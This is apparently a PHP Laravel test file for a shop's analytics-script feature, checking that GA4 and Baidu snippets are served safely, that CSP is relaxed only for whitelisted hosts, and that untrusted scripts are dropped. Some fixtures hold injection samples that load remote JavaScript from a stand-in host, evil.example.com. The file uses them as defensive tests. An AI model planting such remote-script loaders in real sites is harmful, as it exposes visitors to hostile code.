<?php

namespace Tests\Feature;

use App\Models\Setting;
use App\Models\User;
use App\Support\StorefrontConfig;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Spatie\Permission\Models\Role;
use Tests\TestCase;

/**
 * issue #39:v1.12.55 起统计代码静默失效(后台可保存、前台无任何统计请求),
 * v1.12.90 的严格 CSP 又形成第二层阻断。这里覆盖 issue 的全部验收标准。
 */
class AnalyticsScriptTest extends TestCase
{
    use RefreshDatabase;

    /** GA4 官方安装代码:外链 + 内联初始化两段 */
    private const GA4_SNIPPET = <<<'HTML'
<script async src="https://www.googletagmanager.com/gtag/js?id=G-ABC1234567"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-ABC1234567');
</script>
HTML;

    public function test_ga4_snippet_is_served_as_same_origin_javascript(): void
    {
        StorefrontConfig::setMany(['analytics' => ['enabled' => true, 'script' => self::GA4_SNIPPET]]);

        // 公开配置只暴露「是否有可执行脚本」,绝不下发原始代码
        $this->getJson('/api/settings/storefront')->assertOk()
            ->assertJsonPath('analytics.enabled', true)
            ->assertJsonPath('analytics.script_configured', true)
            ->assertJsonMissingPath('analytics.script');

        $response = $this->get('/api/settings/analytics-script')->assertOk()
            ->assertHeader('Content-Type', 'application/javascript; charset=UTF-8');
        $body = $response->getContent();

        // 外链被编译成受控的 createElement 加载,内联初始化保留,<script> 标签不复现
        $this->assertStringContainsString('https://www.googletagmanager.com/gtag/js?id=G-ABC1234567', $body);
        $this->assertStringContainsString("gtag('config', 'G-ABC1234567')", $body);
        $this->assertStringNotContainsString('<script', $body);
        $this->assertStringContainsString('no-store', (string) $response->headers->get('Cache-Control'));
        // 只加载一次 gtag.js:编译结果中该外链只出现一处
        $this->assertSame(1, substr_count($body, 'googletagmanager.com/gtag/js'));
    }

    public function test_enabling_analytics_relaxes_csp_only_for_whitelisted_origins(): void
    {
        StorefrontConfig::setMany(['analytics' => ['enabled' => true, 'script' => self::GA4_SNIPPET]]);

        $csp = (string) $this->get('/')->assertOk()->headers->get('Content-Security-Policy');

        $this->assertStringContainsString('https://*.googletagmanager.com', $csp);
        $this->assertStringContainsString('https://*.google-analytics.com', $csp);
        $this->assertStringNotContainsString("'unsafe-inline'", explode('style-src', $csp)[0]);
    }

    public function test_disabled_analytics_does_not_relax_csp_or_emit_script(): void
    {
        StorefrontConfig::setMany(['analytics' => ['enabled' => false, 'script' => self::GA4_SNIPPET]]);

        $csp = (string) $this->get('/')->assertOk()->headers->get('Content-Security-Policy');
        $this->assertStringNotContainsString('googletagmanager.com', $csp);
        $this->assertStringNotContainsString('google-analytics.com', $csp);

        $this->assertSame('', $this->get('/api/settings/analytics-script')->assertOk()->getContent());
        $this->getJson('/api/settings/storefront')->assertOk()
            ->assertJsonPath('analytics.script_configured', false);
    }

    public function test_script_referencing_untrusted_host_is_dropped_and_admin_is_warned(): void
    {
        $admin = User::factory()->create();
        Role::findOrCreate('super_admin', 'web');
        $admin->assignRole('super_admin');

        $response = $this->actingAs($admin)->putJson('/api/admin/settings', [
            'analytics' => [
                'enabled' => true,
                'script' => '<script src="https://evil.example.com/track.js"></script>',
            ],
        ])->assertOk();

        // 保存不再"静默成功":后台明确拿到丢弃标记
        $response->assertJsonPath('analytics_script_dropped', true);
        $this->assertSame('', $this->get('/api/settings/analytics-script')->assertOk()->getContent());

        $csp = (string) $this->get('/')->assertOk()->headers->get('Content-Security-Policy');
        $this->assertStringNotContainsString('evil.example.com', $csp);
    }

    public function test_inline_event_handlers_and_untrusted_inline_hosts_cannot_execute(): void
    {
        StorefrontConfig::setMany(['analytics' => [
            'enabled' => true,
            // 内联体引用未授权主机 → 整段丢弃(不是只删 URL)
            'script' => '<script>var s=document.createElement("script");s.src="http://evil.example.com/x.js";document.head.appendChild(s);</script>',
        ]]);

        $this->assertSame('', $this->get('/api/settings/analytics-script')->assertOk()->getContent());

        // 纯 JS 配置(不含 <script> 标签)同样要过白名单:引用未授权主机整段丢弃
        StorefrontConfig::setMany(['analytics' => [
            'enabled' => true,
            'script' => 'var s=document.createElement("script");s.src="https://evil.example.com/x.js";document.head.appendChild(s);',
        ]]);
        $this->assertSame('', $this->get('/api/settings/analytics-script')->assertOk()->getContent());
    }

    public function test_baidu_analytics_snippet_is_supported(): void
    {
        StorefrontConfig::setMany(['analytics' => ['enabled' => true, 'script' => <<<'HTML'
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?0123456789abcdef0123456789abcdef";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
})();
</script>
HTML]]);

        $body = $this->get('/api/settings/analytics-script')->assertOk()->getContent();
        $this->assertStringContainsString('hm.baidu.com/hm.js', $body);

        $csp = (string) $this->get('/')->assertOk()->headers->get('Content-Security-Policy');
        $this->assertStringContainsString('https://hm.baidu.com', $csp);
    }

    public function test_legacy_footer_analytics_is_migrated_but_left_disabled(): void
    {
        // 模拟升级前的存量数据:只有旧字段有值
        Setting::updateOrCreate(
            ['key' => 'footer_analytics'],
            ['group' => 'storefront', 'value' => self::GA4_SNIPPET],
        );
        Setting::where('key', 'analytics')->delete();

        // 迁移在测试库初始化时已执行过(migrations 表有记录),这里直接调 up() 验证搬运逻辑
        $migration = require database_path('migrations/2026_08_18_120000_migrate_footer_analytics_to_analytics_setting.php');
        $migration->up();

        $migrated = StorefrontConfig::get('analytics');
        $this->assertSame(self::GA4_SNIPPET, trim((string) $migrated['script']));
        // 旧脚本引用的域名未必在白名单内,升级瞬间不得自动执行远程代码
        $this->assertFalse((bool) $migrated['enabled']);
        $this->assertSame('', $this->get('/api/settings/analytics-script')->assertOk()->getContent());
    }
}
